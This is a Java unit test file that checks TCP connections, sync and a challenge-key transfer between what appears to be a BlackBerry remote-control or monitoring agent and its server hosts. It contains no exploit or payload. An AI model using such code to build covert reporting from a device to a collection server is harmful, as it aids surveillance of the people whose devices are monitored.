package com.ht.tests.unit;

import java.io.IOException;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.tests.AssertException;
import com.ht.tests.TestUnit;
import com.ht.tests.Tests;
import com.ht.tests.accessor.TransferAccessor;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.transfer.DirectTcpConnection;
import com.ht.rcs.blackberry.transfer.ProtocolException;

public class UT_Sync extends TestUnit {

	static Debug debug = new Debug("UT_Sync", DebugLevel.VERBOSE);

	String host = "rcs-prod";
	int port = 80;

	TransferAccessor transfer;
	
	boolean remoteTest = false;

	public UT_Sync(String name, Tests tests) {
		super(name, tests);
		transfer = new TransferAccessor();
	}

	public boolean run() throws AssertException {
		ConnectionTest();
		Utils.sleep(1000);
		
		if(remoteTest)
		{
			ConnectionRemoteTest();
			Utils.sleep(1000);
		}
		
		SyncTest();
		Utils.sleep(1000);
		
		TransferTest();
		Utils.sleep(1000);
		
		//TransferSecureTest();
		//Utils.sleep(1000);
		return true;
	}

	private void SyncTest() throws AssertException {
		
		transfer.init(host, port, false, false);
		
		boolean ret = transfer.send();
		AssertThat(ret == true, "Doesn't send transfer");
				
	}

	private void TransferTest() throws AssertException {

		transfer.init(host, port, false, false);
		try {
			transfer.ChallengeTest();
		} catch (ProtocolException e) {
			debug.error("Protocol exception: " + e);
			throw new AssertException();
		}
	}
	
	private void TransferSecureTest() throws AssertException {

		transfer.init(host, 443, true, false);
		try {
			transfer.ChallengeTest();
		} catch (ProtocolException e) {
			debug.error("Protocol exception: " + e);
			throw new AssertException();
		}
	}

	private void ConnectionTest() throws AssertException {
		DirectTcpConnection connection = new DirectTcpConnection(host, port, false);
		boolean connected = connection.connect();
		AssertThat(connected, "not connected");

		connection.disconnect();
	}

	private void ConnectionRemoteTest() throws AssertException {
		String remoteHost = "iperbole.suppose.it";
		int port = 8080;
		DirectTcpConnection connection = new DirectTcpConnection(remoteHost,
				port, false);
		boolean connected = connection.connect();
		AssertThat(connected, "not connected");

		try {
			debug.trace("send");
			// connection.send("HelloWorld".getBytes());
			boolean ret = connection.send(Keys.getInstance().getChallengeKey());
			AssertThat(ret, "cannot send");
			debug.trace("receive");
			byte[] rec = connection.receive(5);
			String string = new String(rec);
			debug.trace("Received: " + string);
		} catch (IOException e) {
			debug.error(e.toString());
		}

		connection.disconnect();
	}

}
